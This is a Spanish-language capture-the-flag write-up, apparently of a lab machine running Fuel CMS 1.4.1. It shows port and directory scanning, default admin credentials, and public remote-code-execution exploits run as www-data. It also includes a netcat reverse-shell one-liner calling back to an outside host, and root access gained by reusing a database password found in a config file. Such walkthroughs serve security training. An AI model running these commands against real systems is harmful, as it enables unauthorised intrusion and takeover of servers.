## Objetivo
## Pistas
## Solución

```

Primero claro un nmap
──(kali㉿kali)-[~]
└─$ nmap -n -Pn -sV 10.10.253.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-18 19:55 EDT
Nmap scan report for 10.10.253.4
Host is up (0.19s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.57 seconds
                                                                 

solo esta el puerto 80

ahora vamos al gobuster

─(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.253.4/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.253.4/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 290]
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/@                    (Status: 400) [Size: 1134]
/0                    (Status: 200) [Size: 16593]
/assets               (Status: 301) [Size: 311] [--> http://10.10.253.4/assets/]


mientras se analiza vemos que en el sitio nos dan un usuario y un password

#### That's it!

To access the FUEL admin, go to:  
[http://10.10.253.4/fuel](http://10.10.253.4/fuel)  
User name: **admin**  
Password: **admin** (you can and should change this password and admin user information after logging in)

Veamos si podemos acceder al panel de administración usando estas credenciales.

Pude acceder al panel de administración, pero no se cargaba nada. Espero que no sea necesario nada aquí porque no puedo acceder a ninguna de las páginas. Miré algunos de los directorios de Gobuster, pero tampoco contenían nada interesante. La página predeterminada indicaba la versión 1.4. Veamos si hay vulnerabilidades para esta versión. Podemos usar Exploit-DB para comprobarlo.

Hay tres RCE que podemos usar en esta versión del CMS.

http://10.10.253.4/fuel

Fuel CMS 1.4.1


──(kali㉿kali)-[~/Documents/Seguridad de redes/ignite]
└─$ python3 50477.py -u http://10.10.253.4
[+]Connecting...
Enter Command $whoami
systemwww-data


Enter Command $


Tenemos la ubicación del archivo indicado en la página predeterminada del sitio web. Veamos si podemos usar “cat” para mostrar el contenido de este archivo. Enviaremos el siguiente comando a la máquina.

cat fuel/application/config/database.php

.........
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}

Enter Command $ls /home/www-data
systemflag.txt


Enter Command $cat /home/www-data
system

Enter Command $cat /home/www-data/flag.txt
system
6470e394cbf6dab6a91682cc8585059b 


////
                                                                                   
┌──(kali㉿kali)-[~/Documents/Seguridad de redes/ignite]
└─$ chmod +x 47138.py              
                                                                                   
┌──(kali㉿kali)-[~/Documents/Seguridad de redes/ignite]
└─$ ls               
47138.py  php-reverse-shell.php  php.zip
                                                                                   
┌──(kali㉿kali)-[~/Documents/Seguridad de redes/ignite]
└─$ python2 47138.py  

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.0.84 1234 >/tmp/f

┌──(kali㉿kali)-[~/Documents/Seguridad de redes/ignite]
└─$ nc -lnvp 1234                    

listening on [any] 1234 ...
connect to [10.9.0.84] from (UNKNOWN) [10.10.253.4] 32792
sh: 0: can't access tty; job control turned off
$ 

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$ export TERM=xterm
export TERM=xterm
www-data@ubuntu:/var/www/html$ 


──(kali㉿kali)-[~/Documents/Seguridad de redes/ignite]
└─$ nc -lnvp 1234            

listening on [any] 1234 ...
connect to [10.9.0.84] from (UNKNOWN) [10.10.253.4] 32806
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$ cd /home/
cd /home/
www-data@ubuntu:/home$ ls
ls
www-data
www-data@ubuntu:/home$ cd www-data/
cd www-data/
www-data@ubuntu:/home/www-data$ ls
ls
flag.txt
www-data@ubuntu:/home/www-data$ cd /var/www/    
cd /var/www/
www-data@ubuntu:/var/www$ ls
ls
html
www-data@ubuntu:/var/www$ cd html/fuel/application/
cd html/fuel/application/
www-data@ubuntu:/var/www/html/fuel/application$ ls
ls
cache   controllers  helpers  index.html  libraries  migrations  third_party
config  core         hooks    language    logs       models      views
www-data@ubuntu:/var/www/html/fuel/application$ cd config/
cd config/
www-data@ubuntu:/var/www/html/fuel/application/config$ ls
ls
MY_config.php        constants.php      google.php     profiler.php
MY_fuel.php          custom_fields.php  hooks.php      redirects.php
MY_fuel_layouts.php  database.php       index.html     routes.php
MY_fuel_modules.php  doctypes.php       memcached.php  smileys.php
asset.php            editors.php        migration.php  social.php
autoload.php         environments.php   mimes.php      states.php
config.php           foreign_chars.php  model.php      user_agents.php
www-data@ubuntu:/var/www/html/fuel/application/config$ su root     
su root 
Password: mememe

root@ubuntu:/var/www/html/fuel/application/config# pwd
pwd
/var/www/html/fuel/application/config
root@ubuntu:/var/www/html/fuel/application/config# whoami
whoami
root
root@ubuntu:/var/www/html/fuel/application/config# cd /root/
cd /root/
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
b9bbcb33e11b80be759c4e844862482d 
root@ubuntu:~# 

```
## Notas adicionales
## Referencias